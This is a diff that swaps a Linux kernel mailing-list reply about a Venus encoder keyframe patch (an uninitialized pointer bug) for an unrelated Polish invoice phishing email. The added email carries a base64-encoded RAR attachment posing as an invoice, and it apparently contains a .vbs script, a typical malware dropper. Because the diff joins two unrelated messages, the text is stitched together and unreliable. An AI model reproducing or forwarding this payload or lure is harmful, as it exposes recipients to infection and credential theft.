@@ -2,144 +2,97 @@ Return-Path: <SRS0=REtU=MY=vger.kernel.org=linux-kernel-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 X-Spam-Level: 
-X-Spam-Status: No, score=-6.9 required=3.0 tests=DKIM_SIGNED,DKIM_VALID,
-	DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,
-	SIGNED_OFF_BY,SPF_PASS autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=-0.6 required=3.0 tests=FROM_EXCESS_BASE64,
+	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,SPF_PASS autolearn=ham
+	autolearn_force=no version=3.4.0
 Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id B2415C43441
-	for <linux-kernel@archiver.kernel.org>; Fri, 12 Oct 2018 08:10:08 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 71D37C6783C
+	for <linux-kernel@archiver.kernel.org>; Fri, 12 Oct 2018 08:10:50 +0000 (UTC)
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.kernel.org (Postfix) with ESMTP id 6BFEB21477
-	for <linux-kernel@archiver.kernel.org>; Fri, 12 Oct 2018 08:10:08 +0000 (UTC)
-Authentication-Results: mail.kernel.org;
-	dkim=pass (1024-bit key) header.d=linaro.org header.i=@linaro.org header.b="M1w4tJhR"
-DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 6BFEB21477
-Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=linaro.org
+	by mail.kernel.org (Postfix) with ESMTP id F0EE42086A
+	for <linux-kernel@archiver.kernel.org>; Fri, 12 Oct 2018 08:10:49 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org F0EE42086A
+Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=tx.pl
 Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=linux-kernel-owner@vger.kernel.org
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727804AbeJLPlV (ORCPT
+        id S1727835AbeJLPmD (ORCPT
         <rfc822;linux-kernel@archiver.kernel.org>);
-        Fri, 12 Oct 2018 11:41:21 -0400
-Received: from mail-wm1-f66.google.com ([209.85.128.66]:33289 "EHLO
-        mail-wm1-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1727151AbeJLPlV (ORCPT
-        <rfc822;linux-kernel@vger.kernel.org>);
-        Fri, 12 Oct 2018 11:41:21 -0400
-Received: by mail-wm1-f66.google.com with SMTP id y140-v6so17470250wmd.0
-        for <linux-kernel@vger.kernel.org>; Fri, 12 Oct 2018 01:10:05 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=linaro.org; s=google;
-        h=subject:to:cc:references:from:message-id:date:user-agent
-         :mime-version:in-reply-to:content-language:content-transfer-encoding;
-        bh=EFDAKpNV+oqfG/NL5WDbSgkRbVkdTGAFpxa1DpT+db4=;
-        b=M1w4tJhRpwY3qi42sM3ab0lm7fVMDkWKsyXBxDZAOQcfjRvdmfUiCfQ2E2Dq1Xell+
-         QV0JcWjayfl7FWBuPA8wZYCr2UE6C/eS1B+l0iyjI9VrOqHnTcTAhbGo/accUPaBTEwT
-         B4lR+igI+hCp2Ui0japTuP9y44NPud/eL7Cc0=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:subject:to:cc:references:from:message-id:date
-         :user-agent:mime-version:in-reply-to:content-language
-         :content-transfer-encoding;
-        bh=EFDAKpNV+oqfG/NL5WDbSgkRbVkdTGAFpxa1DpT+db4=;
-        b=rE/ShUruKdUM+OUsIoVRfTqW9fSEZ+gWCzN/ziMiw26iVcIk++hcK5rnCD1Demvcbx
-         v/ylPcDSdrHIcscxhpa9lqVWq/6nzumrUiCrXax+3UAI2XnYC0Iguc9Yyi9w3DevK9Zy
-         wY1jtNAF2d4ibfI7Q2UwOzCVHFRZ3v6D3N0zKW7/P8SELpFm0CMpNME+e53+J3yH4rPC
-         DN9AK0xZCah7Bigick/ZLcg2TrA/ssbl/VHj8wEOaFSI90xBW/VYiToDqqxG3yaL2Nms
-         vgKb8X9y6V8hU9g8Bzkcih5XxPQ74x0WvTnWjH0XpnH5DbkOv0DtCrhjQWBMdTYIAIRG
-         j38A==
-X-Gm-Message-State: ABuFfogK2BD9GI/gbJA/KzydptEmb+k2vDtcQhzVHLZoEcMNy1x1YovH
-        15rCJ8JxhVU0CnGsoOW7tNhdww==
-X-Google-Smtp-Source: ACcGV61C6iYBQNqoSeyzpDKbUxcG1xxIG+03M2ytfssJ3kZeRoJtGb7yO4zNvXjPBkdhS3Ma3EgTtw==
-X-Received: by 2002:a1c:c4f:: with SMTP id 76-v6mr4316850wmm.6.1539331804642;
-        Fri, 12 Oct 2018 01:10:04 -0700 (PDT)
-Received: from [192.168.27.209] ([37.157.136.206])
-        by smtp.googlemail.com with ESMTPSA id h78-v6sm697651wmd.4.2018.10.12.01.10.03
-        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
-        Fri, 12 Oct 2018 01:10:03 -0700 (PDT)
-Subject: Re: [PATCH] media: venus: add support for key frame
-To:     Alexandre Courbot <acourbot@chromium.org>
-Cc:     mgottam@codeaurora.org, Hans Verkuil <hverkuil@xs4all.nl>,
-        Mauro Carvalho Chehab <mchehab@kernel.org>,
-        Linux Media Mailing List <linux-media@vger.kernel.org>,
-        LKML <linux-kernel@vger.kernel.org>,
-        linux-arm-msm@vger.kernel.org, vgarodia@codeaurora.org
-References: <1539071634-1644-1-git-send-email-mgottam@codeaurora.org>
- <CAPBb6MUt_V4zEKGcRYXRXNRVdjF2uspOvEj0T-dH6dBZ9ya9CA@mail.gmail.com>
- <f1bb2ead-fe8e-af6a-1b96-9460a7b01f29@linaro.org>
- <CAPBb6MXxaGMCY43fXwWYZmYmiVwDA6kdJRwWZGqUHhWOGXSz7Q@mail.gmail.com>
-From:   Stanimir Varbanov <stanimir.varbanov@linaro.org>
-Message-ID: <40d15ea4-48e2-b2c7-1d70-68dcc1b08990@linaro.org>
-Date:   Fri, 12 Oct 2018 11:10:01 +0300
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
- Thunderbird/52.9.1
+        Fri, 12 Oct 2018 11:42:03 -0400
+Received: from smtp5.tx.pl ([94.158.130.5]:43870 "EHLO tx.pl"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
+        id S1727151AbeJLPmD (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+        Fri, 12 Oct 2018 11:42:03 -0400
+X-Greylist: delayed 1307 seconds by postgrey-1.27 at vger.kernel.org; Fri, 12 Oct 2018 11:42:01 EDT
+Received: from gcncgncgngxnfc (unknown [37.252.11.132])
+        by tx.pl ([Biall-Net]) with ESMTP id 13CE489FB3F
+        for <linux-kernel@vger.kernel.org>; Fri, 12 Oct 2018 09:49:03 +0200 (CEST)
+From:   "=?utf-8?B?VGVjaG5pa2lhbnR5a29yb3p5am5lwqA=?=" <w.kordalska@tx.pl>
+Subject: Faktura
+To:     "linux-kernel" <linux-kernel@vger.kernel.org>
+Content-Type: multipart/mixed; boundary="5WiaL=_0QkTXFMkh543X4axGJ9Nbk6zwFT"
 MIME-Version: 1.0
-In-Reply-To: <CAPBb6MXxaGMCY43fXwWYZmYmiVwDA6kdJRwWZGqUHhWOGXSz7Q@mail.gmail.com>
-Content-Type: text/plain; charset=utf-8
-Content-Language: en-US
-Content-Transfer-Encoding: 7bit
+Reply-To: "=?utf-8?B?VGVjaG5pa2lhbnR5a29yb3p5am5lwqAobWFyZWsudHlyeWJvbik=?=" 
+          <apexserwis4r44@apextk.pl>
+Organization: katarzyna.piotrowiak@interbell.pl
+Date:   Fri, 12 Oct 2018 10:48:59 +0300
+Message-Id: <20181012074904.13CE489FB3F@tx.pl>
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
+This is a multi-part message in MIME format
+
+--5WiaL=_0QkTXFMkh543X4axGJ9Nbk6zwFT
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+Szanowny Kliencie,
+
+W zalaczniku przesylam dane do faktur i rozliczenia.
 
 
-On 10/12/2018 11:06 AM, Alexandre Courbot wrote:
-> On Fri, Oct 12, 2018 at 4:37 PM Stanimir Varbanov
-> <stanimir.varbanov@linaro.org> wrote:
->>
->> Hi Alex,
->>
->> On 10/12/2018 08:26 AM, Alexandre Courbot wrote:
->>> On Tue, Oct 9, 2018 at 4:54 PM Malathi Gottam <mgottam@codeaurora.org> wrote:
->>>>
->>>> When client requests for a keyframe, set the property
->>>> to hardware to generate the sync frame.
->>>>
->>>> Signed-off-by: Malathi Gottam <mgottam@codeaurora.org>
->>>> ---
->>>>  drivers/media/platform/qcom/venus/venc_ctrls.c | 13 +++++++++++++
->>>>  1 file changed, 13 insertions(+)
->>>>
->>>> diff --git a/drivers/media/platform/qcom/venus/venc_ctrls.c b/drivers/media/platform/qcom/venus/venc_ctrls.c
->>>> index 45910172..f332c8e 100644
->>>> --- a/drivers/media/platform/qcom/venus/venc_ctrls.c
->>>> +++ b/drivers/media/platform/qcom/venus/venc_ctrls.c
->>>> @@ -81,6 +81,8 @@ static int venc_op_s_ctrl(struct v4l2_ctrl *ctrl)
->>>>         struct venc_controls *ctr = &inst->controls.enc;
->>>>         u32 bframes;
->>>>         int ret;
->>>> +       void *ptr;
->>>> +       u32 ptype;
->>>>
->>>>         switch (ctrl->id) {
->>>>         case V4L2_CID_MPEG_VIDEO_BITRATE_MODE:
->>>> @@ -173,6 +175,14 @@ static int venc_op_s_ctrl(struct v4l2_ctrl *ctrl)
->>>>
->>>>                 ctr->num_b_frames = bframes;
->>>>                 break;
->>>> +       case V4L2_CID_MPEG_VIDEO_FORCE_KEY_FRAME:
->>>> +               ptype = HFI_PROPERTY_CONFIG_VENC_REQUEST_SYNC_FRAME;
->>>> +               ret = hfi_session_set_property(inst, ptype, ptr);
->>>
->>> The test bot already said it, but ptr is passed to
->>> hfi_session_set_property() uninitialized. And as can be expected the
->>> call returns -EINVAL on my board.
->>>
->>> Looking at other uses of HFI_PROPERTY_CONFIG_VENC_REQUEST_SYNC_FRAME I
->>> see that the packet sent to the firmware does not have room for an
->>> argument, so I tried to pass NULL but got the same result.
->>
->> yes, because pdata cannot be NULL. I'd suggest to make a pointer to
->> struct hfi_enable and pass it to the set_property function.
-> 
-> FWIW I also tried doing this and got the same error, strange...
-> 
 
-OK, when you calling the v4l control? It makes sense when you calling
-it, because set_property checks does the session is on START state (i.e.
-streamon on both queues).
 
--- 
-regards,
-Stan
+
+Pozdrawiam
+
+Rafal Kowalski
+
+Biuro POLBUD
+
+
+--5WiaL=_0QkTXFMkh543X4axGJ9Nbk6zwFT
+Content-Type: application/octet-stream;
+	name="faktura_121018_8780001.rar"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="faktura_121018_8780001.rar"
+
+UmFyIRoHAQDz4YLrCwEFBwAGAQGAgIAAk3QCzjcCAwufCQTwF4ABkRbcYYADABpmYWt0dXJhXzEy
+MTAxOF84NzgwMDAxLnZicwoDAiJTtWWiYdQByw6bBDYFMzM0TzYFXuc8KYfRRLsols/FGDNAu6Jl
+ltzNyOy5jgt3d61G05Ha5E8aUtkvveuTOFSWbEpHRniCosbSJPDwlFFPx4/hElEnhJ+KIQBSIHPE
+opMjt412TLigf0XJ5zaOR3tPKaJ9GaeVPI790YUKT19yESjBhn7jBVyo0G+nrqDLgzTIkHsXiSHU
+gnOo0EUcQU4iauw4QJ/Iel1Oo/5lo/6BmVEUQypqbH/8pNv++fY7ukJAiVgCmoAxlH/7vzS+QDvr
+FKGjXnBc9AlzmJavjSuS4Tzh6j3SPHmCIcZwgC5UukIy5rpnwSO9IZsxKP8EHdJg/A50jQxHqNCz
+vQS6ElRiEFpvfEYsUU9UZhkkNip7Qja01OvNlhVIjK6IsESGi7X3+8vKbNXjqOLJsQXAqePjIDGG
+YaLGUgRlkJj6g5ndokwNYyl96aMs6yOsZX6IySeohJx3eMsmVVWce37WuN2sRyphUSf4EBl0PmVD
+j1cvjU6p50Tu/c6c2Q4nlnUNWACGqCycg2gJeX8PicAKrz8kIZ0ojVX/t+988GDueIMaZa9+Y4HX
+uzqwPcg8Y1KmT+/Ly8zOK9ijvLaowS71mlSUUdWcOGYbaPNjIMQiJ50J2N+CMu8rqXr6TvhADZJM
+DXBKc8ztgPhypF8gvvKCLFqRFI+xLQZabeUlsaPCls6WAEb9c5Ffd4c1WNuuOs9y4hVUefRXmxzf
+zHJn6LHPz83Pb4uJAOXQUXljDRE4DlKAnG6LqWgVkLtLjtku2eMuAPQYriTWIF/XhRkeFa7dd/9M
+dt0bsUXkRhkA0nGIkEf671Z5MMhwBH3nRaokdQqPiLbsHlJNT7LOXkeZ+wAMJpekIpn5MqTa1wYg
+DweK7PIE+v12WLKtHzZ+I4Xc/1XirV3//eNu6boIRFl4CpJ4OxCKouLgWBLOLbqthNpT6xeu/9+i
+sQO4cNx+Die0rIxv5rNu1qq1boF+EhYefI7a0ihpuwdSzhSSq8kSl/D22SppoGHBcugOI4W798V+
+/gdFov8mvSD8iHUL3I/qPGmMcrAFDpnPMFjJBniTnDQwiKj/jU8LcTyphZJFFm6tklZUVmukGsuF
+bf7hHJkhXbfIoitn1Y9raoq1XbX3SF7WvzbEVqrXp7ccC0W5pbkkiK+63bu29RxqkbdZqfbHD4Bs
+8l7VF2PjZr2q9nm+FexZtt8gW6IAYyZBZ2jLvJ2cUOuB8CORV1FehFBR1e42QHGwytH1j+ZWw1lr
+pNPeZALxt6CyoDZ4LjgaXXwSGmcvAIFijXwCdMCp6rOmO0vjpxXvPEAn5Sfj7Rfa42Yb3w5gtCFt
+7UrcD5FQ1VnWyG9xLjIeIzTJeccpiY3LVnZXYVyIvAOtLLNnsiW2/SN2q3252eYT6wYxwfax5xIF
+pz+tyN8yT+zP1Dgttfzje8C01kIDVPc5bFF2SxDgbII4YLg0hYmYy6a5tb3b1OtE+QHUHCj4A3AI
+7UenI754bwcWJedZIZdH589y+tczKQIUwdZs/dD7nUe8MY67Wd3/8D5p9lFmw2j4Bt7rfOOM2LPg
+LFq1zwKy+aL7W3NE0B13VlEDBQQA
+
+--5WiaL=_0QkTXFMkh543X4axGJ9Nbk6zwFT--
+
